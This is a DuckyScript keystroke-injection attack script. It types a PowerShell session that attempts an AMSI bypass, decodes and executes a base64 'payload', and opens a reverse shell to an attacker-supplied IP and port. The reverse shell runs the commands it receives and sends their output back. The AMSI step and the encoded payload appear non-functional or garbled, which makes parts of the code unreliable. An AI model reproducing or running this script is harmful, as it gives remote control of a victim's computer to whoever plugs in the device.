DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000

REM Bypass AMSI using reflection
STRING Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport("amsi.dll", SetLastError = true)]
    public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, int length, out int result);
}
"@
ENTER
DELAY 500
STRING $null = [AMSI]::AmsiScanBuffer(0, [System.Text.Encoding]::ASCII.GetBytes("malicious code"), 20, [ref]$null)
ENTER

DELAY 500

REM Obfuscated payload downloader using PowerShell
STRING $payload = "JAB3AHYAYwB6aXn4cTp2YfhgA2Stw5kOrP5pQ5O72cm8aLg72g=="  
ENTER
DELAY 500
STRING $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
ENTER
DELAY 500
STRING Invoke-Expression $decoded
ENTER

DELAY 500
STRING Write-Host "Payload executed successfully."
ENTER

DELAY 500

REM Reverse Shell Setup (Example)
STRING $ip = "YOUR_IP_ADDRESS"
ENTER
DELAY 500
STRING $port = "YOUR_PORT"
ENTER
DELAY 500
STRING $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
ENTER
DELAY 500
STRING $stream = $client.GetStream()
ENTER
DELAY 500
STRING [byte[]]$bytes = 0..255|%{0}
ENTER
DELAY 500
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
ENTER
DELAY 500
STRING     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
ENTER
DELAY 500
STRING     $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
ENTER
DELAY 500
STRING     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
ENTER
DELAY 500
STRING     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
ENTER
DELAY 500
STRING     $stream.Write($sendbyte, 0, $sendbyte.Length)
ENTER
DELAY 500
STRING     $stream.Flush()
ENTER
DELAY 500
STRING }
ENTER

DELAY 500
STRING Write-Host "Reverse shell initiated."
ENTER
